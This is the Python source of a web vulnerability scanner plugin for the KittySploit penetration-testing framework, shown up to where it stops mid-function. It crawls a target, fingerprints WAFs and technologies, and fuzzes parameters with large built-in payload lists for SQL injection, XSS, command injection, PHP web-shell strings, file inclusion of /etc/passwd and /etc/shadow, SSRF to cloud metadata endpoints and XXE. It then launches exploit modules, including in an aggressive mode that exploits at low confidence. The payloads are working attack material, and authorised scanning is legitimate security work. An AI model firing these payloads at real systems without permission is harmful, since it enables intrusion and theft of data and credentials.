#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Web Vulnerability Scanner Plugin for KittySploit
Automatically crawls websites, parses URLs/parameters, and tests vulnerabilities
using appropriate exploit modules.
"""

from kittysploit import *
import shlex
import re
import os
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs
from collections import defaultdict, deque
import threading
import queue
import time
from uuid import uuid4
import random
import string
from typing import Dict, List, Set, Tuple, Optional, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from itertools import chain

try:
    import requests
    from bs4 import BeautifulSoup
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


# --- Constants & Signatures ---

WAF_SIGNATURES = {
    'Cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
    'AWS WAF': ['x-amzn-requestid', 'aws-waf'],
    'Akamai': ['akamai', 'ak_bmsc'],
    'F5 BIG-IP': ['bigip', 'f5_cspm'],
    'Imperva': ['incap_ses', 'visid_incap'],
    'Barracuda': ['barra_counter_session'],
    'ModSecurity': ['mod_security', 'modsecurity_ids'],
    'Sucuri': ['sucuri', 'x-sucuri'],
    'Fortinet': ['fortigate', 'fortiwaf'],
    'Palo Alto': ['x-pan-os-protect'],
    'StackPath': ['x-stackpath'],
    'Wordfence': ['wordfence'],
    'Unknown WAF': ['waf', 'firewall', 'protect', 'blocked'] # Generic catch-all
}

SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pg_query(): query failed",
    "sqlite error",
    "mysql_fetch_array()",
    "sqlstate",
    "ora-01756",
    "ora-00933",
    "microsoft ole db provider for odbc drivers",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "sql server driver",
    "postgresql query failed",
    "warning: pg_",
    "valid mysql result",
    "myodbc sql server driver",
    "sql command not properly ended",
    "sql syntax near",
    "mysql_num_rows()",
    "mysql_query()",
    "mysql_fetch_assoc()",
    "mysql_fetch_row()",
    "mysql_fetch_object()",
    "supplied argument is not a valid mysql result",
    "column count doesn't match value count",
    "table '.*' doesn't exist",
    "unknown column",
    "duplicate entry",
    "syntax error",
    "unexpected end of sql command",
    "integrity constraint violation",
]

WINDOWS_LFI_MARKERS = [
    "[fonts]",
    "[extensions]",
    "for 16-bit app support",
    "[drivers]",
    "[mci extensions]",
    "windows\\\\system32",
    "root:x:", # For when windows can read linux files (e.g. WSL or weird setups) - unlikely but possible in CTFs
    "default=multi(0)disk(0)rdisk(0)partition(1)",
]

LINUX_LFI_MARKERS = [
    "root:x:0:0:",
    "daemon:x:",
    "/bin/bash",
    "/usr/sbin/nologin",
    "PATH=",
]

# Payloads SQLi avancés
SQLI_PAYLOADS = {
    'error_based': [
        "'",
        "\"",
        "'\"))-- -",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1, @@version --",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
    ],
    'boolean_based': [
        ("1' AND '1'='1", "1' AND '1'='2"),
        ("1' OR '1'='1", "1' OR '1'='2"),
        ("1' AND 1=1", "1' AND 1=2"),
        ("1' OR 1=1", "1' OR 1=2"),
        ("' AND 'a'='a", "' AND 'a'='b"),
        ("1 AND 1=1", "1 AND 1=2"),
    ],
    'time_based': [
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
        "'; SELECT BENCHMARK(5000000,MD5(1))--",
        "'; (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND SLEEP(5)#",
        "1 OR SLEEP(5)#",
    ],
    'union_based': [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT user(),database(),version()--",
        "' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL--",
    ],
}

# Payloads XSS avancés
XSS_PAYLOADS = [
    "<svg/onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<svg><animatetransform onbegin=alert('XSS')>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "<svg><script>alert('XSS')</script>",
    "<iframe srcdoc='<script>alert(\"XSS\")</script>'>",
    "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
    "<link rel=stylesheet href=data:,*%7bx:expression(alert('XSS'))%7d",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
]

# Payloads RCE avancés par langage
RCE_PAYLOADS = {
    'generic': [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "&& id",
        "|| id",
        "& id",
        "; echo KSP_RCE_TEST",
        "| echo KSP_RCE_TEST",
        "`echo KSP_RCE_TEST`",
        "$(echo KSP_RCE_TEST)",
        "&& echo KSP_RCE_TEST",
        "|| echo KSP_RCE_TEST",
    ],
    'php': [
        "<?php system('id'); ?>",
        "<?php exec('id'); ?>",
        "<?php shell_exec('id'); ?>",
        "<?php passthru('id'); ?>",
        "<?php echo shell_exec('id'); ?>",
        "<?= system('id'); ?>",
        "<?php eval($_GET['cmd']); ?>",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpDTs/Pg==", # <?php system("id");?>
    ],
    'python': [
        "__import__('os').system('id')",
        "eval('__import__(\"os\").system(\"id\")')",
        "exec('__import__(\"os\").system(\"id\")')",
        "compile('__import__(\"os\").system(\"id\")', '<string>', 'exec')",
        "[x for x in [__import__('os').system('id')]]",
        "{{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].strip()}}", # SSTI common
    ],
    'nodejs': [
        "require('child_process').exec('id')",
        "global.process.mainModule.require('child_process').execSync('id')",
        "child_process.exec('id')",
        "eval('require(\"child_process\").exec(\"id\")')",
    ],
    'java': [
        "Runtime.getRuntime().exec('id')",
        "ProcessBuilder('id').start()",
        "new ProcessBuilder('id').start()",
        "${T(java.lang.Runtime).getRuntime().exec('id')}", # SPEL
    ],
}

# Payloads LFI avancés
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "../../../../etc/passwd%00",
    "../../../../etc/passwd\x00",
    "....//....//....//windows/win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "/proc/self/environ",
    "/proc/version",
    "/etc/shadow",
    "/etc/hosts",
    "C:\\boot.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
]

# Payloads SSRF
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "file:///etc/passwd",
    "file:///C:/windows/win.ini",
    "gopher://127.0.0.1:80",
    "dict://127.0.0.1:80",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:22",
    "http://127.0.0.1:8080",
]

# Payloads XXE
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><foo>&xxe;</foo>',
]


class WebVulnScannerPlugin(Plugin):
    """Web Vulnerability Scanner Plugin"""
    
    __info__ = {
        "name": "web_vuln_scanner",
        "description": "Automated web vulnerability scanner with crawling and smart module selection",
        "version": "1.1.1",
        "author": "KittySploit Team",
        "dependencies": ["requests", "beautifulsoup4"]
    }
    
    def __init__(self, framework=None):
        super().__init__(framework)
        self.crawled_urls: Set[str] = set()
        self.url_queue = queue.Queue()
        self.results = []
        self.technologies = defaultdict(list)
        self.aggressive = False
        self.min_confidence = 70
        self.max_modules = 3
        self.stop_flag = threading.Event()
        self.page_cache: Dict[str, Dict[str, Any]] = {}
        self.cache_lock = Lock()
        self.results_lock = Lock()
        self.crawl_delay = 0.2
        self.html_cache: Dict[str, Any] = {}
        self.max_cache_size = 1000
        self.waf_detected = None
        self.session = None
        
    def check_dependencies(self):
        """Check if all dependencies are available"""
        if not REQUESTS_AVAILABLE:
            print_error("Missing dependencies: requests, beautifulsoup4")
            print_info("Install with: pip install requests beautifulsoup4")
            return False
        return True
    
    def run(self, *args, **kwargs):
        """Main plugin execution"""
        parser = ModuleArgumentParser(description="Web Vulnerability Scanner", prog="web_vuln_scanner")
        parser.add_argument("-u", "--url", dest="url", help="Target URL to scan", metavar="<url>", type=str, required=True)
        parser.add_argument("-d", "--depth", dest="depth", help="Crawling depth (default: 2)", metavar="<depth>", type=int, default=2)
        parser.add_argument("-t", "--threads", dest="threads", help="Number of threads (default: 5)", metavar="<threads>", type=int, default=5)
        parser.add_argument("-m", "--modules", dest="modules", help="Comma-separated list of module patterns (default: all)", metavar="<modules>", type=str, default="all")
        parser.add_argument("--no-crawl", dest="no_crawl", help="Disable crawling, only test provided URL", action="store_true")
        parser.add_argument("--timeout", dest="timeout", help="Request timeout in seconds (default: 10)", metavar="<timeout>", type=int, default=10)
        parser.add_argument("--crawl-delay", dest="crawl_delay", help="Delay between crawl requests (default: 0.2)", metavar="<seconds>", type=float, default=0.2)
        parser.add_argument("--user-agent", dest="user_agent", help="Custom User-Agent string", metavar="<ua>", type=str, default="Mozilla/5.0 (KittySploit Scanner)")
        parser.add_argument("--cookie", dest="cookie", help="Cookie string for authenticated requests", metavar="<cookie>", type=str, default="")
        parser.add_argument("--min-confidence", dest="min_confidence", help="Minimum confidence (0-100) (default: 70)", metavar="<confidence>", type=int, default=70)
        parser.add_argument("--max-modules", dest="max_modules", help="Max modules per URL (default: 3)", metavar="<count>", type=int, default=3)
        parser.add_argument("--aggressive", dest="aggressive", help="Attempt exploitation even with low confidence", action="store_true")
        parser.add_argument("-v", "--verbose", dest="verbose", help="Verbose output", action="store_true")
        
        if not args or not args[0]:
            parser.print_help()
            return True
        
        try:
            pargs = parser.parse_args(shlex.split(args[0]))
            
            if getattr(pargs, 'help', False):
                parser.print_help()
                return True
            
            if not self.check_dependencies():
                return False
            
            # Start scanning
            return self._scan_website(
                url=pargs.url,
                depth=pargs.depth,
                threads=pargs.threads,
                module_patterns=pargs.modules.split(',') if pargs.modules != 'all' else ['all'],
                no_crawl=pargs.no_crawl,
                timeout=pargs.timeout,
                crawl_delay=pargs.crawl_delay,
                user_agent=pargs.user_agent,
                cookie=pargs.cookie,
                verbose=pargs.verbose,
                min_confidence=pargs.min_confidence,
                max_modules=pargs.max_modules,
                aggressive=pargs.aggressive
            )
            
        except Exception as e:
            print_error(f"An error occurred: {e}")
            import traceback
            if 'pargs' in locals() and pargs.verbose:
                traceback.print_exc()
            return False
    
    def _scan_website(self, url: str, depth: int = 2, threads: int = 5, 
                      module_patterns: List[str] = ['all'], no_crawl: bool = False,
                      timeout: int = 10, crawl_delay: float = 0.2, user_agent: str = "", cookie: str = "",
                      verbose: bool = False, min_confidence: int = 70,
                      max_modules: int = 3, aggressive: bool = False) -> bool:
        """Main scanning function"""
        try:
            # Silence SSL warnings
            try:
                import urllib3
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            except:
                pass

            print_success("Starting Web Vulnerability Scanner")
            print_info(f"Target: {url}")
            print_info(f"Depth: {depth} | Threads: {threads}")
            print_info(f"Modules: {module_patterns} | Min Conf: {min_confidence}%")
            
            if aggressive:
                print_warning("Aggressive mode enabled - EXTREME CAUTION ADVISED.")
            
            # Normalize URL
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Initialize session
            self._init_session(user_agent, cookie, timeout, crawl_delay)
            self.verbose = verbose
            self.base_url = base_url
            self.results = []
            self.crawled_urls = set()
            self.page_cache = {}
            self.html_cache = {}
            self.technologies = defaultdict(list)
            self.tech_tokens = set()
            self.min_confidence = max(0, min(100, min_confidence))
            self.max_modules = max(1, max_modules)
            self.aggressive = aggressive
            self.waf_detected = None
            self.threads = max(1, threads)
            
            # Step 0: WAF Detection
            print_status("Step 0: Detecting WAF protection...")
            self._detect_waf(url)
            if self.waf_detected:
                print_warning(f"WAF Detected: {self.waf_detected}")
                if not aggressive:
                    print_info("Adjusting scan verification requests to mitigate blocking.")
                    self.crawl_delay += 0.5
            else:
                print_success("No WAF detected (or transparent).")

            # Step 1: Crawl website
            if not no_crawl:
                print_status("Step 1: Crawling website...")
                self._crawl_website(url, depth)
                # Discovery fallback
                print_status("Step 1b: Running discovery for common sensitive files...")
                self._discover_common_files()
            else:
                print_status("Step 1: Skipping crawl (--no-crawl)")
                self.crawled_urls.add(url)
            
            print_success(f"Found {len(self.crawled_urls)} URLs to test")
            
            # Step 2: Analyze URLs and extract parameters
            print_status("Step 2: Analyzing URLs and extracting parameters...")
            url_data = self._analyze_urls()
            
            total_with_params = sum(1 for u in url_data if u.get('has_params', False))
            print_success(f"Found {len(url_data)} unique endpoints ({total_with_params} with parameters)")
            
            # Step 3: Detect technologies
            print_status("Step 3: Detecting technologies...")
            self._detect_technologies()
            
            if self.technologies:
                print_success("Detected stack components:")
                for tech, urls in self.technologies.items():
                    print_info(f"  - {tech}: {len(urls)} URLs")
            
            # Step 4: Active exploitation attempts
            urls_with_params = [u for u in url_data if u.get('has_params', False)]
            if urls_with_params:
                print_status("Step 4: Actively verifying high-risk parameters...")
                active_hits = self._active_exploit(urls_with_params)
                print_success(f"Completed active exploitation. Confirmed {active_hits} vectors.")
            else:
                print_status("Step 4: Skipping active exploitation (no parameters found)")
            
            # Step 5: Find appropriate modules
            print_status("Step 5: Finding appropriate exploit modules...")
            modules = self._find_modules(module_patterns, url_data)
            
            if not modules:
                print_warning("No specific exploit modules matched the detected stack.")
                print_info("Consider running generic scanner modules manually.")
            else:
                print_success(f"Found {len(modules)} potential exploit modules")
                top_modules = modules[:10]
                for mod in top_modules:
                    path = mod['path']
                    score = mod['score']
                    print_info(f"  - {path} (match score: {score})")
            
            # Step 6: Test vulnerabilities
            if modules:
                print_status("Step 6: Testing vulnerabilities (Module Phase)...")
                self._test_vulnerabilities(url_data, modules, threads)
            else:
                print_status("Step 6: Skipping module testing.")
            
            # Step 7: Display results
            print_status("Step 7: Results Summary")
            self._display_results()
            
            return True
            
        except Exception as e:
            print_error(f"Scanning error: {e}")
            import traceback
            if verbose:
                traceback.print_exc()
            return False

    def _init_session(self, user_agent, cookie, timeout, crawl_delay):
        """Initialize requests session with retry logic and pooling"""
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=20,
            pool_maxsize=50,
            max_retries=requests.adapters.Retry(total=3, backoff_factor=0.5)
        )
        self.session = requests.Session()
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        self.session.verify = False # Disable SSL verification for speed/internal targets
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        if cookie:
            self.session.headers.update({'Cookie': cookie})
        
        self.timeout = timeout
        self.crawl_delay = max(0.0, crawl_delay)

    def _detect_waf(self, url):
        """Detect WAF presence by sending suspicious payloads"""
        try:
            # Baseline request
            base_resp = self._get_page(url)
            if not base_resp:
                return
            
            # 1. Check headers in baseline
            for header, value in base_resp['headers'].items():
                for waf, sigs in WAF_SIGNATURES.items():
                    if any(sig in header.lower() or sig in value.lower() for sig in sigs):
                        self.waf_detected = waf
                        return

            # 2. Provocation request (mild SQLi)
            provocation_url = f"{url}?id=1%20UNION%20SELECT%201,2,3--&test=<script>alert(1)</script>"
            try:
                resp = self.session.get(provocation_url, timeout=self.timeout)
                # Check status codes common for WAFs
                if resp.status_code in [403, 406, 501, 999]:
                    for waf, sigs in WAF_SIGNATURES.items():
                        if any(sig in resp.text.lower() for sig in sigs):
                            self.waf_detected = waf
                            return
                    self.waf_detected = "Generic/Unknown WAF"
                
                # Check headers in provocation response
                for header, value in resp.headers.items():
                    for waf, sigs in WAF_SIGNATURES.items():
                        if any(sig in header.lower() or sig in value.lower() for sig in sigs):
                            self.waf_detected = waf
                            return
            except Exception:
                pass
                
        except Exception as e:
            if self.verbose:
                print_warning(f"WAF detection error: {e}")

    def _crawl_website(self, start_url: str, max_depth: int):
        """Crawl website and collect URLs (parallelized)"""
        visited = set()
        visited_lock = Lock()
        to_visit = deque([(start_url, 0)])
        to_visit_lock = Lock()
        base_netloc = urlparse(self.base_url).netloc
        
        static_exts = {'.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.ico', '.svg', '.woff', '.woff2', '.ttf', '.pdf'}
        
        def crawl_worker():
            while not self.stop_flag.is_set():
                url_data = None
                with to_visit_lock:
                    if to_visit:
                        url_data = to_visit.popleft()
                
                if not url_data:
                    break
                
                current_url, depth = url_data
                
                with visited_lock:
                    if current_url in visited:
                        continue
                    visited.add(current_url)
                    self.crawled_urls.add(current_url)
                
                if depth >= max_depth:
                    continue
                
                try:
                    page = self._get_page(current_url)
                    if not page or page['status_code'] != 200:
                        continue
                        
                    # Parse HTML
                    soup = self._get_cached_soup(current_url, page['text'])
                    new_links = set()
                    
                    # <a> tags
                    for link in soup.find_all('a', href=True):
                        new_links.add(link['href'])
                    
                    # <form> actions
                    for form in soup.find_all('form', action=True):
                        new_links.add(form['action'])
                    
                    for raw_link in new_links:
                        # Clean and join
                        abs_link = urljoin(current_url, raw_link)
                        parsed = urlparse(abs_link)
                        
                        # Filter out external domains
                        if parsed.netloc and parsed.netloc != base_netloc:
                            continue
                            
                        # Filter out static assets
                        path_lower = parsed.path.lower()
                        if any(path_lower.endswith(ext) for ext in static_exts):
                            continue
                        
                        # Filter out mailto/tel
                        if parsed.scheme in ['mailto', 'tel', 'javascript']:
                            continue
                            
                        # Add to queue
                        with visited_lock:
                            if abs_link not in visited:
                                with to_visit_lock:
                                    to_visit.append((abs_link, depth + 1))
                                    
                except Exception as e:
                    if self.verbose:
                        print_warning(f"Crawl error on {current_url}: {e}")
        
        # Start crawl threads
        num_workers = min(10, self.max_modules * 2)
        with ThreadPoolExecutor(max_workers=num_workers) as executor:
            futures = [executor.submit(crawl_worker) for _ in range(num_workers)]
            for future in as_completed(futures):
                pass
    
    def _analyze_urls(self) -> List[Dict]:
        """Analyze URLs and extract parameters"""
        url_data = []
        
        for url in self.crawled_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            path_params = self._extract_path_params(parsed.path)
            form_data = self._extract_form_data(url)
            js_endpoints = self._extract_js_endpoints(url)
            
            # Check for interesting extensions
            ext = os.path.splitext(parsed.path)[1].lower()
            is_interesting = ext in ['.php', '.jsp', '.asp', '.aspx', '.cgi', '.pl', '']
            
            url_entry = {
                'url': url,
                'path': parsed.path,
                'query_params': params,
                'path_params': path_params,
                'form_data': form_data,
                'js_endpoints': js_endpoints,
                'method': 'POST' if form_data else 'GET',
                'signals': set(),
                'has_params': bool(params or path_params or form_data)
            }
            if is_interesting or url_entry['has_params']:
                url_data.append(url_entry)
        
        # Sort by importance (has_params first)
        url_data.sort(key=lambda x: (not x['has_params'], x['url']))
        return url_data

    def _extract_path_params(self, path: str) -> List[str]:
        """Extract potential path parameters"""
        params = []
        if not path or path == '/': return params
        
        # Numeric ID
        params.extend(re.findall(r'/\d+', path))
        # UUID
        params.extend(re.findall(r'/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', path, re.I))
        
        # API style segments
        segments = [s for s in path.split('/') if s]
        if len(segments) >= 2:
            if segments[-1].isdigit() or len(segments[-1]) > 10:
                params.append(f"/{segments[-1]}")
        return params

    def _extract_form_data(self, url: str) -> Dict:
        """Extract inputs from forms"""
        try:
            page = self._get_page(url)
            if not page or page['status_code'] != 200: return {}
            
            soup = self._get_cached_soup(url, page['text'])
            data = {}
            for form in soup.find_all('form'):
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if not name: continue
                    value = inp.get('value', '')
                    # Fuzz string if empty
                    if not value:
                        value = 'test'
                    data[name] = value
            return data
        except Exception:
            return {}

    def _extract_js_endpoints(self, url: str) -> List[str]:
        """Extract API endpoints from JS"""
        endpoints = []
        try:
            page = self._get_page(url)
            if not page: return []
            text = page.get('text', '')
            
            # Regex for paths inside quotes
            # Looks for strings starting with / or http, ending with typical API extensions or just generic paths
            potential_paths = re.findall(r'["\']((?:https?://|/)[a-zA-Z0-9_/.-]+)["\']', text)
            
            base_netloc = urlparse(url).netloc
            for p in potential_paths:
                full = urljoin(url, p)
                if urlparse(full).netloc == base_netloc:
                    endpoints.append(full)
            return list(set(endpoints))
        except:
            return []

    def _discover_common_files(self):
        """Active discovery of common sensitive files if not found by crawler"""
        common_paths = [
            'robots.txt', 'sitemap.xml', '.git/config', '.env', 'phpinfo.php', 
            'config.php', 'wp-config.php', '.htaccess', 'backup.zip', 'backup.sql',
            'admin/', 'login/', 'api/v1/', 'assets/', 'uploads/'
        ]
        
        # We target the base URL
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(self._get_page, urljoin(self.base_url, path)): path for path in common_paths}
            for future in as_completed(futures):
                path = futures[future]
                try:
                    resp = future.result()
                    # 200 is a hit, 403 is also interesting (indicates existence)
                    if resp and resp['status_code'] in [200, 403]:
                        full_url = urljoin(self.base_url, path)
                        if full_url not in self.crawled_urls:
                            if self.verbose: print_info(f"  [+] Discovered: {path} ({resp['status_code']})")
                            self.crawled_urls.add(full_url)
                except:
                    pass

    def _detect_technologies(self):
        """Detect technologies using headers and content with tokenization"""
        # We only check a subset of URLs to save time
        check_urls = list(self.crawled_urls)[:15]
        if not check_urls: return
        
        # Common tech keywords to look for
        known_keywords = {
            'nginx', 'apache', 'php', 'wordpress', 'drupal', 'joomla', 'laravel', 
            'django', 'tomcat', 'iis', 'express', 'node', 'fastapi', 'flask', 
            'ubuntu', 'debian', 'centos', 'redhat', 'windows', 'asp.net', 'jsp'
        }

        for url in check_urls:
            page = self._get_page(url)
            if not page: continue
            
            headers = page['headers']
            text = (page['text'] or "").lower()
            
            # 1. Header Analysis (Tokenize Server and X-Powered-By)
            for header in ['Server', 'X-Powered-By', 'Via', 'X-AspNet-Version']:
                if header in headers:
                    val = headers[header]
                    self.technologies[val].append(url)
                    # Tokenize
                    tokens = re.split(r'[^a-zA-Z0-9.-]', val.lower())
                    for token in tokens:
                        if len(token) > 1:
                            if token in known_keywords or any(k in token for k in known_keywords):
                                self.tech_tokens.add(token)

            # 2. Content Analysis (Heuristics)
            heuristics = {
                'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
                'Drupal': ['drupal.js', 'sites/all', 'drupal settings'],
                'Joomla': ['joomla!', 'option=com_', '/media/system/js/'],
                'Laravel': ['laravel_session', 'x-csrf-token'],
                'Django': ['csrftoken', '__admin__', 'django'],
                'PHP': ['phpinfo', '.php', 'powered by php'],
                'Tomcat': ['jsessionid', 'apache tomcat'],
                'Express': ['x-powered-by: express'],
                'FastAPI': ['fastapi', 'openapi.json'],
                'React': ['react-root', '__react'],
            }

            for tech, sigs in heuristics.items():
                if any(sig in text for sig in sigs):
                    self.technologies[tech].append(url)
                    self.tech_tokens.add(tech.lower())
                    
        # Add basic OS tokens if found in server string
        if 'ubuntu' in self.tech_tokens: self.tech_tokens.add('linux')
        if 'win' in self.tech_tokens: self.tech_tokens.add('windows')

    def _active_exploit(self, url_data: List[Dict]) -> int:
        """Active verification of parameters"""
        if not url_data: return 0
        confirmed_count = 0
        
        # Limit the number of URLs to actively exploit to prevent timeouts
        target_urls = url_data[:20] if not self.aggressive else url_data 
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._test_url_entry, entry) for entry in target_urls]
            for future in as_completed(futures):
                try:
                    confirmed_count += future.result()
                except Exception as e:
                    if self.verbose: print_warning(f"Active exploit thread error: {e}")
        return confirmed_count

    def _test_url_entry(self, entry: Dict) -> int:
        """Test a single URL for all injections"""
        url = self._clean_url(entry['url'])
        params = self._flatten_params(entry.get('query_params', {}))
        form_data = dict(entry.get('form_data', {}))
        count = 0
        
        if params:
            count += self._fuzz_params(url, params, 'GET', entry)
        if form_data:
            count += self._fuzz_params(url, form_data, 'POST', entry)
            
        return count

    def _fuzz_params(self, url, params, method, entry):
        """Fuzz a set of parameters"""
        hits = 0
        for param, orig_val in params.items():
            # Skip uninteresting params unless aggressive
            if not self.aggressive and param.lower() in ['lang', 'language', 'submit']:
                continue
                
            # Heuristic: Determine likely vulnerability type
            ptype = self._infer_param_type(param)
            
            # Test based on type + generic
            if ptype == 'sqli' or ptype == 'unknown':
                hits += self._test_sqli(url, params, param, method, entry)
            if ptype == 'xss' or ptype == 'unknown':
                hits += self._test_xss(url, params, param, method, entry)
            if ptype == 'rce' or ptype == 'unknown':
                hits += self._test_rce(url, params, param, method, entry)
            if ptype == 'lfi' or ptype == 'unknown':
                hits += self._test_lfi(url, params, param, method, entry)
            if ptype == 'ssrf' or ptype == 'unknown':
                hits += self._test_ssrf(url, params, param, method, entry)
                
        return hits

    def _infer_param_type(self, param: str) -> str:
        p = param.lower()
        if any(x in p for x in ['id', 'user', 'num', 'account', 'query']): return 'sqli'
        if any(x in p for x in ['search', 'q', 'comment', 'msg', 'name']): return 'xss'
        if any(x in p for x in ['cmd', 'exec', 'ping', 'dir', 'shell']): return 'rce'
        if any(x in p for x in ['file', 'path', 'doc', 'folder', 'include']): return 'lfi'
        if any(x in p for x in ['url', 'uri', 'site', 'host', 'dest']): return 'ssrf'
        return 'unknown'

    def _test_url_entry(self, entry: Dict) -> int:
        """Test a single URL using appropriate KittySploit modules"""
        url = self._clean_url(entry['url'])
        params = self._flatten_params(entry.get('query_params', {}))
        form_data = dict(entry.get('form_data', {}))
        
        count = 0
        parsed = urlparse(url)
        base_target = f"{parsed.scheme}://{parsed.netloc}"
        
        # Determine likely vulnerabilities based on parameters
        for param in chain(params.keys(), form_data.keys()):
            ptype = self._infer_param_type(param)
            method = 'GET' if param in params else 'POST'
            
            # Map vulnerability types to KittySploit scanner modules
            # We use the auxiliary/scanner/http modules instead of redundant code
            vuln_modules = {
                'sqli': 'auxiliary/scanner/http/sql_injection',
                'xss': 'auxiliary/scanner/http/xss_scanner',
                'lfi': 'auxiliary/scanner/http/lfi_fuzzer',
                'ssrf': 'auxiliary/scanner/http/ssrf_scanner',
                'xxe': 'auxiliary/scanner/http/xxe_scanner'
            }
            
            # If we identified a likely type, prioritze that module
            module_path = vuln_modules.get(ptype)
            
            # Otherwise, if we are in aggressive mode or it's 'unknown', 
            # we might want to test everything (handled by the loop)
            types_to_test = [ptype] if ptype != 'unknown' else vuln_modules.keys()
            
            for t in types_to_test:
                mod_path = vuln_modules.get(t)
                if not mod_path: continue
                
                # Run the module
                if self._run_generic_scanner(mod_path, base_target, parsed.path, param, method, entry):
                    count += 1
                    entry['signals'].add(t)
                    # If we found a hit, maybe stop testing other types for this param?
                    if not self.aggressive: break
                    
        return count

    def _run_generic_scanner(self, mod_path, target, path, parameter, method, entry):
        """Helper to run a generic KittySploit scanner module with specific parameters"""
        try:
            module = self.framework.module_loader.load_module(mod_path, framework=self.framework)
            if not module: return False
            
            # Universal configuration
            self._set_vals(module, 'RHOSTS', urlparse(target).hostname)
            self._set_vals(module, 'TARGET', target)
            self._set_vals(module, 'PATH', path)
            self._set_vals(module, 'PARAMETER', parameter)
            self._set_vals(module, 'METHOD', method)
            
            # Specific options for some modules
            if 'lfi_fuzzer' in mod_path:
                # lfi_fuzzer uses 'target' as full URL with parameter
                full_url = f"{target}{path}?{parameter}=" if method == 'GET' else f"{target}{path}"
                self._set_vals(module, 'target', full_url)
                self._set_vals(module, 'parameter', parameter)

            # Execute check or run
            if hasattr(module, 'check'):
                res = module.check()
                if self._check_is_vuln(res):
                    vuln_name = mod_path.split('/')[-1].replace('_', ' ').title()
                    self._record_result(
                        url=f"{target}{path}", 
                        attack=vuln_name, 
                        parameter=parameter, 
                        evidence=f"Confirmed by {mod_path}", 
                        method=method
                    )
                    return True
            
            # Some modules only have run()
            if hasattr(module, 'run'):
                # Redirect output? No, let it print or capture results if module supports it
                # For now, we assume if run() completes and we can verify state...
                # Ideally scanners return a boolean or a list of found vulns.
